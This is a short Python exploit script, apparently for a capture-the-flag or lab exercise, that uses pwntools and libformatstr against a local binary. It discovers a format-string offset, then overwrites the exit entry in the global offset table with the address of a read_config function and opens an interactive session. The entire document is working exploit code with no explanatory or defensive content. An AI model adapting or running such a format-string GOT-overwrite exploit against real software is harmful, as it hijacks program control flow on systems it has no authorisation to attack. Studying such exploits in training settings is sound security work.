from libformatstr import *
from pwn import *

bufsize = 512 #char s[512]
buf = ""
r = process("./a") #target binary

r.send(make_pattern(bufsize) + "\n") #send pattern
r.recvuntil("copyright:\n")
data = r.recv()
offset, padding = guess_argnum(data, bufsize) #determinate offset and padding
r.close()

log.info("offset: " + str(offset))
log.info("padding: " + str(padding))


elf = ELF("./a") #loading target binary

log.info("exit@plt: " + hex(elf.got["exit"]))
log.info("read_config: " + hex(elf.symbols["read_config"]))

p = FormatStr(bufsize)
p[elf.got["exit"]] = elf.symbols["read_config"] #replace exit in got with read_config
buf += p.payload(offset,padding) #create buffer exploit

r = process("./a")
r.send(buf + "\n") #send buffer

r.interactive() #go interactive